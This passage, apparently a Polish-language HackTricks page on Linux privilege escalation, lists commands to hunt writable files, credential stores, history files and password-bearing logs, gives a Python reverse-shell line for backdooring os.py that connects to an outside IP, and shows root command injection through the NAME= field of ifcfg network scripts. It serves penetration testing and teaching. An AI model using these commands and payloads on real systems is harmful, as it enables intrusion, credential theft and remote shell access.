#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ostatnich minutach
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki bazy danych Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_historia, .sudo\_jako\_administrator\_udany, profil, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty/Binary w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki internetowe**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przeczytaj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), który przeszukuje **kilka możliwych plików, które mogą zawierać hasła**.\
**Innym interesującym narzędziem**, które możesz użyć do tego celu, jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), które jest aplikacją open source służącą do odzyskiwania wielu haseł przechowywanych na lokalnym komputerze dla systemów Windows, Linux i Mac.

### Dzienniki

Jeśli możesz czytać dzienniki, możesz być w stanie znaleźć **interesujące/poufne informacje w ich wnętrzu**. Im bardziej dziwny jest dziennik, tym bardziej interesujący będzie (prawdopodobnie).\
Ponadto, niektóre "**źle**" skonfigurowane (z tylnią furtką?) **dzienniki audytu** mogą pozwolić ci na **rejestrowanie haseł** w dziennikach audytu, jak wyjaśniono w tym poście: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby **czytać logi, grupa** [**adm**](interesting-groups-linux-pe/#adm-group) będzie naprawdę pomocna.

### Pliki powłoki
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Powinieneś również sprawdzić pliki zawierające słowo "**password**" w **nazwie** lub wewnątrz **treści**, a także sprawdzić IP i e-maile w logach, lub wyrażenia regularne dla hashy.\
Nie zamierzam tutaj wymieniać, jak to wszystko zrobić, ale jeśli jesteś zainteresowany, możesz sprawdzić ostatnie kontrole, które wykonuje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Writable files

### Python library hijacking

Jeśli wiesz, **skąd** skrypt pythonowy będzie wykonywany i **możesz pisać w** tym folderze lub **możesz modyfikować biblioteki python**, możesz zmodyfikować bibliotekę OS i wprowadzić do niej backdoora (jeśli możesz pisać tam, gdzie skrypt pythonowy będzie wykonywany, skopiuj i wklej bibliotekę os.py).

Aby **wprowadzić backdoora do biblioteki**, po prostu dodaj na końcu biblioteki os.py następującą linię (zmień IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Wykorzystanie logrotate

Luka w `logrotate` pozwala użytkownikom z **uprawnieniami do zapisu** w pliku dziennika lub jego katalogach nadrzędnych potencjalnie uzyskać podwyższone uprawnienia. Dzieje się tak, ponieważ `logrotate`, często działający jako **root**, może być manipulowany do wykonywania dowolnych plików, szczególnie w katalogach takich jak _**/etc/bash\_completion.d/**_. Ważne jest, aby sprawdzić uprawnienia nie tylko w _/var/log_, ale także w każdym katalogu, w którym stosuje się rotację logów.

{% hint style="info" %}
Ta luka dotyczy wersji `logrotate` `3.18.0` i starszych
{% endhint %}

Szczegółowe informacje na temat luki można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Możesz wykorzystać tę lukę za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta luka jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logi nginx),** więc za każdym razem, gdy stwierdzisz, że możesz zmieniać logi, sprawdź, kto zarządza tymi logami i sprawdź, czy możesz uzyskać podwyższone uprawnienia, zastępując logi dowiązaniami symbolicznymi.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referencja luki:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Jeśli, z jakiegokolwiek powodu, użytkownik jest w stanie **zapisać** skrypt `ifcf-<cokolwiek>` do _/etc/sysconfig/network-scripts_ **lub** może **dostosować** istniejący, to twój **system jest pwned**.

Skrypty sieciowe, _ifcg-eth0_ na przykład, są używane do połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednak są \~sourced\~ w systemie Linux przez Network Manager (dispatcher.d).

W moim przypadku, atrybut `NAME=` w tych skryptach sieciowych nie jest obsługiwany poprawnie. Jeśli masz **białą/pustą przestrzeń w nazwie, system próbuje wykonać część po białej/pustej przestrzeni**. Oznacza to, że **wszystko po pierwszej pustej przestrzeni jest wykonywane jako root**.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd i rc.d**

Katalog `/etc/init.d` jest domem dla **skryptów** System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linuksie**. Zawiera skrypty do `start`, `stop`, `restart`, a czasami `reload` usług. Mogą być one wykonywane bezpośrednio lub przez dowiązania symboliczne znajdujące się w `/etc/rc?.d/`. Alternatywną ścieżką w systemach Redhat jest `/etc/rc.d/init.d`.

Z drugiej strony, `/etc/init` jest związany z **Upstart**, nowszym **systemem zarządzania usługami** wprowadzonym przez Ubuntu, wykorzystującym pliki konfiguracyjne do zadań zarządzania usługami. Pomimo przejścia na Upstart, skrypty SysVinit są nadal wykorzystywane obok konfiguracji Upstart z powodu warstwy zgodności w Upstart.

**systemd** pojawia się jako nowoczesny menedżer inicjalizacji i usług, oferujący zaawansowane funkcje, takie jak uruchamianie demonów na żądanie, zarządzanie automontowaniem i migawki stanu systemu. Organizuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucyjnych i `/etc/systemd/system/` dla modyfikacji administratora, usprawniając proces administracji systemem.

## Inne sztuczki

### Eskalacja uprawnień NFS

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no_root_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Ucieczka z ograniczonych powłok

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Ochrony bezpieczeństwa jądra

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Statyczne binaria impacket](https://github.com/ropnop/impacket_static_binaries)

## Narzędzia Privesc Linux/Unix

### **Najlepsze narzędzie do wyszukiwania wektorów eskalacji uprawnień lokalnych w Linuksie:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Wykrywanie luk w jądrze w Linuksie i MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (dostęp fizyczny):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Kompilacja więcej skryptów**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Odniesienia

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się sztuczkami hackingowymi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
